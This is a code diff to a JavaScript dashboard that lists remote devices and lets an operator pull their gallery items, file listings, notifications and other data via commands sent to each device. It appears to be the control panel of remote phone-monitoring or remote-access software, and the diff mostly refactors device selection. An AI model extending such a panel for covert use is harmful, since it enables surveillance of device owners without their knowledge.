@@ -54,8 +54,11 @@ function fetchDashboardData() {
 function updateDevices(devices) {
     const el = document.getElementById('devices-list');
     if (!devices || devices.length === 0) { el.innerHTML = '<p>No devices connected</p>'; return; }
-    el.innerHTML = devices.map(d => `
-        <div class="device-card ${d.status === 'ONLINE' ? 'online' : 'offline'}">
+
+    let html = '';
+    devices.forEach(d => {
+        const isSelected = currentDeviceSessionId === d.id;
+        html += `<div class="device-card ${d.status === 'ONLINE' ? 'online' : 'offline'} ${isSelected ? 'selected' : ''}" data-id="${d.id}" data-status="${d.status}">
             <div class="dev-header">
                 <strong>#${d.id}</strong>
                 <span class="dev-status" style="color:${d.status === 'ONLINE' ? '#3fb950' : '#f85149'}">${d.status}</span>
@@ -65,13 +68,27 @@ function updateDevices(devices) {
                 Model: ${d.model}<br>
                 Img: ${d.images} | Vid: ${d.videos} | Notif: ${d.notifications}
             </div>
-        </div>`).join('');
+        </div>`;
+    });
+    el.innerHTML = html;
 
-    // Auto-select first online device
+    // Add click handlers to online devices only
+    el.querySelectorAll('.device-card.online').forEach(card => {
+        card.addEventListener('click', () => {
+            const deviceId = parseInt(card.dataset.id);
+            currentDeviceSessionId = deviceId;
+            // Re-render to update selection highlighting
+            updateDevices(devices);
+        });
+    });
+
+    // Auto-select first online device if none selected or selected device is offline
     const onlineDevices = devices.filter(d => d.status === 'ONLINE');
     if (onlineDevices.length > 0) {
         if (!currentDeviceSessionId || !devices.find(d => d.id === currentDeviceSessionId && d.status === 'ONLINE')) {
             currentDeviceSessionId = onlineDevices[0].id;
+            // Re-render to show auto-selection
+            updateDevices(devices);
         }
     }
 }
@@ -163,40 +180,41 @@ function setupGalleryControls() {
 }
 
 function loadGallery() {
-    // FIX 1: Get first online device dynamically instead of hardcoded session=***
-    fetch('/api/devices').then(r => r.json()).then(devices => {
-        const onlineDevice = devices.find(d => d.status === 'ONLINE');
-        const sessionId = onlineDevice ? onlineDevice.id : 1;
+    // Use currently selected device or find first online device
+    if (!currentDeviceSessionId) {
+        document.getElementById('gallery-grid').innerHTML = '<p>No device selected. Please select a device from the dashboard.</p>';
+        return;
+    }
+    const sessionId = currentDeviceSessionId;
 
-        fetch('/api/gallery?session=' + sessionId).then(r => r.json()).then(data => {
-            const grid = document.getElementById('gallery-grid');
-            const items = data.gallery || [];
-            if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
-            grid.innerHTML = items.map(item => {
-                const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
-                const icon = isImg ? '\u{1F5BC}' : (item.type && item.type.startsWith('video/') ? '\u{1F3AC}' : '\u{1F4C4}');
-                // FIX 2: Show source folder of each image
-                const parts = (item.name || '').split('/');
-                const fileName = parts[parts.length - 1] || item.name || 'Unknown';
-                const folderName = parts.length > 1 ? parts.slice(0, -1).join('/') : '';
-                const displayName = folderName ? fileName + ' (' + folderName + ')' : fileName;
-                return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}" data-folder="${folderName}">
+    fetch('/api/gallery?session=' + sessionId).then(r => r.json()).then(data => {
+        const grid = document.getElementById('gallery-grid');
+        const items = data.gallery || [];
+        if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
+        grid.innerHTML = items.map(item => {
+            const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
+            const icon = isImg ? '\u{1F5BC}' : (item.type && item.type.startsWith('video/') ? '\u{1F3AC}' : '\u{1F4C4}');
+            // Show source folder of each image
+            const parts = (item.name || '').split('/');
+            const fileName = parts[parts.length - 1] || item.name || 'Unknown';
+            const folderName = parts.length > 1 ? parts.slice(0, -1).join('/') : '';
+            const displayName = folderName ? fileName + ' (' + folderName + ')' : fileName;
+            return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}" data-folder="${folderName}">
                     <div class="gi-icon">${icon}</div>
                     <div class="gi-name">${displayName}</div>
                     <div class="gi-size">${formatSize(item.size || 0)}</div>
                 </div>`;
-            }).join('');
+        }).join('');
 
-            grid.querySelectorAll('.gallery-item').forEach(el => {
-                el.addEventListener('click', () => {
-                    grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
-                    el.classList.add('selected');
-                    selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type, folder: el.dataset.folder };
-                });
+        grid.querySelectorAll('.gallery-item').forEach(el => {
+            el.addEventListener('click', () => {
+                grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
+                el.classList.add('selected');
+                selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type, folder: el.dataset.folder };
             });
         });
     }).catch(() => {
-        document.getElementById('gallery-grid').innerHTML = '<p>No devices online.</p>';
+        document.getElementById('gallery-grid').innerHTML = '<p>Error loading gallery data.</p>';
     });
 }
 
@@ -224,41 +242,40 @@ function setupFileBrowserControls() {
 }
 
 function browseFiles(path, skipHistory) {
-    // FIX 3: Get first online device dynamically
-    fetch('/api/devices').then(r => r.json()).then(devices => {
-        const onlineDevice = devices.find(d => d.status === 'ONLINE');
-        sessionId = onlineDevice ? onlineDevice.id : 1;
+    // Use currently selected device or find first online device
+    if (!currentDeviceSessionId) {
+        document.getElementById('filebrowser-status').textContent = 'No device selected. Please select a device from the dashboard.';
+        return;
+    }
+    const sessionId = currentDeviceSessionId;
 
-        // Save current path to history before navigating (unless going back)
-        if (!skipHistory) {
-            const currentPath = document.getElementById('filepath-input').value.trim();
-            if (currentPath && currentPath !== path) {
-                fileBrowserHistory.push(currentPath);
-            }
+    // Save current path to history before navigating (unless going back)
+    if (!skipHistory) {
+        const currentPath = document.getElementById('filepath-input').value.trim();
+        if (currentPath && currentPath !== path) {
+            fileBrowserHistory.push(currentPath);
         }
-        document.getElementById('filepath-input').value = path;
+    }
+    document.getElementById('filepath-input').value = path;
 
-        sendCommand('list_files', JSON.stringify({ path })).then(() => {
-            document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
-            // Poll for response with retries (device may take time)
-            let attempts = 0;
-            const maxAttempts = 5;
-            const pollFiles = () => {
-                fetch('/api/filebrowser?session=' + sessionId).then(r => r.json()).then(data => {
-                    const files = data.files || [];
-                    if (!files.length && attempts < maxAttempts) {
-                        attempts++;
-                        setTimeout(pollFiles, 1000 * attempts);
-                        return;
-                    }
-                    renderFileBrowser(files, path);
-                });
-            };
-            // Small delay to let command reach device
-            setTimeout(pollFiles, 1500);
-        });
-    }).catch(() => {
-        document.getElementById('filebrowser-status').textContent = 'No devices online.';
+    sendCommand('list_files', JSON.stringify({ path })).then(() => {
+        document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
+        // Poll for response with retries (device may take time)
+        let attempts = 0;
+        const maxAttempts = 5;
+        const pollFiles = () => {
+            fetch('/api/filebrowser?session=' + sessionId).then(r => r.json()).then(data => {
+                const files = data.files || [];
+                if (!files.length && attempts < maxAttempts) {
+                    attempts++;
+                    setTimeout(pollFiles, 1000 * attempts);
+                    return;
+                }
+                renderFileBrowser(files, path);
+            });
+        };
+        // Small delay to let command reach device
+        setTimeout(pollFiles, 1500);
     });
 }
 
@@ -397,7 +414,11 @@ function setupDataViewerControls() {
     ];
     btns.forEach(([id, type, renderer]) => {
         document.getElementById(id)?.addEventListener('click', () => {
-            const sessionId = currentDeviceSessionId || 1;
+            if (!currentDeviceSessionId) {
+                document.getElementById('data-viewer').innerHTML = '<p class="data-empty">No device selected. Please select a device from the dashboard.</p>';
+                return;
+            }
+            const sessionId = currentDeviceSessionId;
 
             // Map data types to server commands
             const cmdMap = {
